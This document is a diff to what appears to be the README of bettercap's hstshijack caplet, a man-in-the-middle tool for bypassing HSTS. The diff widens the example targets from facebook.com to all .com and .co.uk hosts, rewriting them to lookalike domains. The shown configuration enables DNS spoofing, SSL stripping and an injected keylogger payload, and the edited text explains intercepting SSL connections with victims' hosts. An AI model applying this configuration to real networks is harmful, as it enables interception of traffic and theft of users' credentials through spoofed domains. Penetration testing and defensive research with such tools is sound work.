@@ -8,15 +8,15 @@
 set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
 set hstshijack.payload         /usr/local/share/bettercap/caplets/hstshijack/payloads/hstshijack-payload.js
 set hstshijack.ignore          *
-set hstshijack.targets         facebook.com,*.facebook.com
-set hstshijack.replacements    facedook.com,*.facedook.com
-set hstshijack.blockscripts    facebook.com,*.facebook.com
+set hstshijack.targets         *.com, *.co.uk
+set hstshijack.replacements    *.corn,*.cc.uk
+#set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
 set hstshijack.encode          true
 set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-set dns.spoof.domains  facedook.com,*.facedook.com
+set dns.spoof.domains  *.corn,*.cc.uk
 
 http.proxy  on
 dns.spoof   on
@@ -24,9 +24,11 @@ dns.spoof   on
 
 ### Core payload
 
-This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that communicates with bettercap, revealing all URLs that were discovered in the injected document.
+This module injects HTML & JS files with a payload (<a href="./payloads/hstshijack-payload.js">**hstshijack-payload.js**</a>) that replaces targeted hostnames with spoofed ones, and communicates with bettercap, revealing all URLs that were discovered in the injected document.
 
-This is done in separate and asynchronous requests so that the bettercap proxy can adjust the host and path for each request, in order to send a HEAD request to learn each host's response to a HTTP request.
+When bettercap receives a callback with a new URL, it sends a HEAD request to learn whether the host in this URL sends HTTPS redirects, and keeps a log.
+
+This is done so that bettercap can know whether it should MITM an SSL connection with a host, before the victim navigates to it.
 
 ### Custom payloads
 
@@ -89,8 +91,6 @@ form.onsubmit = function() {
 
 The code above will send a POST request that will be sniffed by bettercap, but not proxied. 
 
-As soon as bettercap receives a silent callback, any request for the targeted host will no longer be spoofed for that client.
-
 ### Whitelisting callbacks
 
 You can stop attacking a client on a certain host when you receive a request from that client for the whitelist path. The whitelist path will be inserted wherever you have `obf_path_whitelist` written in your payloads (`/` will not be written).
@@ -144,8 +144,8 @@ For every hostname you assign to `hstshijack.targets` you must assign a replacem
 Example:
 
 ```sh
-set hstshijack.targets       blockchain.info,*.blockchain.info
-set hstshijack.replacements  blockchian.info,*.blockchian.info
+set hstshijack.targets       *.com, blockchain.info,*.blockchain.info
+set hstshijack.replacements  *.corn,blockchian.info,*.blockchian.info
 ```
 
 You can try to make them as unnoticeable or obvious as you like, but your options are limited here.
